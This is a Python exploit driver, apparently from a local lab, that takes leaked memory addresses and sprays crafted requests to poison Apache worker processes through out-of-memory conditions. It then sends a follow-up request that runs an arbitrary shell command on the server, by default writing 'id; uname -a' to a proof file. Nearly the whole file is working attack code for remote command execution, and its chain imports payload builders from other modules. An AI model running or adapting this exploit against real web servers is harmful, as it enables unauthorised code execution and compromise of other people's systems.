#!/usr/bin/env python3
"""A2/B2 worker-poisoning loop using a previously obtained B1 leak.

The 4-A1 / 4-A2 run showed:
  - A1 hits all initial workers; B1 leaks from a poisoned child.
  - A2 hits all initial workers, but the A2 OOMs make Apache spawn a new
    child (PID 32), which then serves B2 unpoisoned and returns the normal
    3-byte page.
  - B2 itself is harmless on an unpoisoned child.

This script takes the valid S/zif from the B1 leak and repeatedly sprays A2
in waves sized to MaxRequestWorkers, then sends B2, until a wave covers the
grown pool (including replacement children) and B2 lands on a poisoned
child. Every B2 is a fresh command with `rm -f /out/ka` so a stale proof
cannot be mistaken for success.

usage:
  python3 a2_b2_poison.py --port 18112 \
    --s 0x7f8f834f8398 --zif 0x7f8f8542f370 --workers 8
"""
from __future__ import annotations

import argparse
import concurrent.futures
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.dirname(HERE)
PAYLOADS = os.path.join(LAB, "payloads")
sys.path.insert(0, HERE)
sys.path.insert(0, PAYLOADS)

import poison_chain as p  # type: ignore
from cheap_oom_a import build_body as build_a2  # type: ignore


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18112)
    ap.add_argument("--s", required=True)
    ap.add_argument("--zif", required=True)
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--waves", type=int, default=3)
    ap.add_argument("--wave-delay", type=float, default=0.2)
    ap.add_argument("--attempts", type=int, default=4)
    ap.add_argument("--cmd",
                    default="rm -f /out/ka; (id; uname -a) > /out/ka 2>&1")
    args = ap.parse_args()
    s_addr = int(args.s, 0)
    zif = int(args.zif, 0)
    proof = os.path.join(LAB, "multi-out", "ka")

    a2 = build_a2(880, 64, 115, b"a" * 32, b"k0", p.k.BOUNDARY)
    b2 = p.build_b2(s_addr, zif, args.cmd.encode())
    print("A2=%d B2=%d S=%#x zif=%#x workers=%d"
          % (len(a2), len(b2), s_addr, zif, args.workers))

    def clean_proof() -> None:
        # /out is root-owned inside the mount; clean as root so a non-B2
        # cannot leave a stale success.
        os.system("docker exec p2s-multi-18112 rm -f /out/ka >/dev/null 2>&1")

    clean_proof()

    for attempt in range(1, args.attempts + 1):
        print("=== attempt %d: %d waves x %d A2 ==="
              % (attempt, args.waves, args.workers))
        for wave in range(1, args.waves + 1):
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=args.workers) as ex:
                futs = [ex.submit(p.send_a2, args.host, args.port, a2)
                        for _ in range(args.workers)]
                statuses = [f.result() for f in
                            concurrent.futures.as_completed(futs)]
            oks = sum(1 for st in statuses if "500" in st)
            print("  wave %d: %d/%d 500, sample=%r"
                  % (wave, oks, len(statuses), statuses[0]))
            time.sleep(args.wave_delay)

        print("  B2 attempt %d" % attempt)
        try:
            st, hd = p.send_b2(args.host, args.port, b2)
            print("  B2 status=%r conn=%r" % (st[:40],
                                              hd.get(b"connection", b"")))
        except Exception as exc:
            print("  B2 failed: %r" % (exc,))
        time.sleep(0.5)
        if os.path.exists(proof):
            data = open(proof, "r", errors="replace").read()
            if data.strip():
                print("PROOF %s:" % proof)
                print(data)
                return 0
            print("  proof empty")
        else:
            print("  no proof")
        clean_proof()
    print("no proof after %d attempts" % args.attempts)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
